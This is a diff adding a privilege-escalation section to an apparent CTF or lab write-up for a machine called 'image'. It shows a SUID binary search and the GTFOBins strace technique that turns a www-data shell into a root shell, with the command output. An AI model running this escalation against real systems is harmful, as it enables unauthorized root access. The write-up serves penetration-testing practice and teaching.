@@ -82,4 +82,41 @@ check back listener and we got a reverse shell as `www-data`.
 
 ## Privilege Escalation 
 
+```
+www-data@image:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/strace
+/usr/bin/fusermount                                                           
+/usr/bin/sudo               
+/usr/bin/su                      
+/usr/bin/umount                                                               
+/usr/bin/passwd            
+/usr/bin/chsh                 
+/usr/bin/chfn                 
+/usr/bin/at                      
+/usr/bin/mount                 
+/usr/bin/newgrp                 
+/usr/bin/gpasswd                
+/usr/bin/pkexec             
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign    
+/usr/lib/eject/dmcrypt-get-device
+```
+loocking for suid, we got an suid `/usr/bin/strace`. let's abuse this. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/444e47f5-832f-4096-b93b-9e88af2abeff)
+
+found abuse commands in gtfobins
+
+```shell
+www-data@image:/var/www/html$ /usr/bin/strace -o /dev/null /bin/bash -p 
+bash-5.0# whoami 
+root
+bash-5.0# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-5.0# 
+```
+abused the suid binary and we got a root shell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0081f65c-de3f-4d87-b6dc-e89f45509140)
+
+and we are through. 🙂 easy yeah
